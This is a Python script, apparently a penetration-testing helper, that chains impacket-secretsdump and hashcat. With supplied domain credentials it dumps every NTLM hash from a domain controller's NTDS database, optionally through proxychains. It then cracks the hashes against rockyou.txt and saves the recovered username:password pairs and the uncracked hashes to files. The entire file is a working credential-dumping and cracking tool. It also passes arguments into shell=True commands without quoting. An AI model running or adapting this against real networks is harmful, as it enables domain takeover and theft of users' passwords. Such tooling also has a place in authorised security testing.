# https://www.youtube.com/watch?v=WGewfvluu_8

import argparse
import re
import subprocess

# ToDo: add Hash option for secretsdump command

def main():
    # main arguments for secretsdump
    parser = argparse.ArgumentParser(description="Execute secretsdump followed by hashcat. Results saved in <User>:<Password/Hash> format.")
    required_args = parser.add_argument_group('required arguments')
    required_args.add_argument('-d', '--domain', required=True, help="Domain name")
    required_args.add_argument('-u', '--user', required=True, help="Username")
    required_args.add_argument('-p', '--password', required=True, help="Password")
    required_args.add_argument('-dc', '--dcip', required=True, help="Domain Controller IP address")
    
    # additional arguments for hashcat
    parser.add_argument('-w', '--wordlist', help="Wordlist for hashcat (default: /usr/share/wordlists/rockyou.txt)")
    parser.add_argument('-r', '--rules', default=None, help="Hashcat rules")
    parser.add_argument('-O', '--optimized', action='store_true', help="Run Hashcat in optimized mode")
    
    # optional argument for proxychains
    parser.add_argument('-P', '--proxy', action='store_true', help="Use/prepend proxychains to secretsdump command")

    args = parser.parse_args()

    # set wordlist to rockyou.txt in Kali's default wordlist path if wordlist parameter wasn't used
    if args.wordlist == None:
        args.wordlist = '/usr/share/wordlists/rockyou.txt'
    
    # using Kali installed version of impacket commands for secretsdump
    cmd = f"impacket-secretsdump {args.domain}/{args.user}:'{args.password}'@{args.dcip} -just-dc-ntlm"
    if args.proxy:
        cmd = "proxychains " + cmd
    print(f"Executing command: {cmd}")

    results = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    lines = results.stdout.split("\n")

    # flags to determine the desired lines
    start = False
    relevant_lines = []
    nt_hashes = []

    for line in lines:
        if "[*] Using the DRSUAPI method to get NTDS.DIT secrets" in line:
            start = True
            continue

        if start and "[*] Cleaning up..." in line:
            break

        if start:
            # filter the undedesired lines
            if not line.startswith(("Guest", "krbtgt")) and "$:" not in line:
                relevant_lines.append(line)
                # extract NT hash
                match = re.search(r':([a-fA-F0-9]{32}):::', line)
                if match:
                    nt_hashes.append(match.group(1))

    # write the lines to "ntds-relevant-hashes.txt"
    with open("ntds-relevant-hashes.txt", "w") as f:
        f.write("\n".join(relevant_lines))

    # write the NT hashes to "ntds-nt-hashes.txt"
    with open("ntds-nt-hashes.txt", "w") as f:
        f.write("\n".join(nt_hashes))

    # construct hashcat command
    hashcat_cmd = f"hashcat -m 1000 -a 0 ntds-nt-hashes.txt {args.wordlist}"
    if args.rules:
        hashcat_cmd += f" -r {args.rules}"
    if args.optimized:
        hashcat_cmd += " -O"

    print(f"Executing command: {hashcat_cmd}")
    # capture hashcat output
    result = subprocess.run(hashcat_cmd, shell=True, capture_output=True, text=True)

    # extract numbers for recovered and total hashes
    recovered_match = re.search(r'Recovered\.\.\.\.\.\.\.\.: (\d+)/(\d+)', result.stdout)
    if recovered_match:
        recovered_hashes = int(recovered_match.group(1))
        total_hashes = int(recovered_match.group(2))

        # if any hashes were recovered
        if recovered_hashes > 0:
            # running hashcat with --show flag
            hashcat_show_cmd = f"hashcat -m 1000 -a 0 ntds-nt-hashes.txt {args.wordlist} --show"
            show_result = subprocess.run(hashcat_show_cmd, shell=True, capture_output=True, text=True)

            # load the original hashes and users
            with open("ntds-relevant-hashes.txt", "r") as f:
                original_data = f.readlines()
            
            hash_to_user = {re.search(r':([a-fA-F0-9]{32}):::', line).group(1): line.split(":")[0] for line in original_data}
            cracked_data = show_result.stdout.split("\n")

            # map cracked hashes to users
            cracked_users = {}
            for line in cracked_data:
                if ":" in line:
                    hash_value, password = line.split(":")
                    user = hash_to_user[hash_value]
                    cracked_users[user] = password

            # save the results to <domain>-cracked-users.txt
            with open(f"{args.domain}-cracked-users.txt", "w") as f:
                for user, password in cracked_users.items():
                    f.write(f"{user}:{password}\n")

            with open(f"{args.domain}-cracked-users.txt", "r") as f:
                cracked_file = f.readlines()

            print(f"Passwords cracked! Please see {args.domain}-cracked-users.txt file for results.")
            
            # map opposing data i.e., non-cracked hahshes to users in same format
            non_cracked_users = []
            for line in original_data:
                match = False
                for uname in cracked_file:
                    if uname.split(':')[0] == line.split(':')[0]:
                        match = True
                if match == False:
                    non_cracked_users.append(line.split(':')[0] + ':' + line.split(':')[3] + '\n')
            
            # save the results to <domain>-non-cracked-users.txt
            with open(f"{args.domain}-non-cracked-users.txt", "w") as f:
                for user_hash in non_cracked_users:
                    f.write(user_hash)
        else:
            print("No passwords were cracked.")
    else:
        print("Could not parse hashcat output.")

if __name__ == "__main__":
    main()
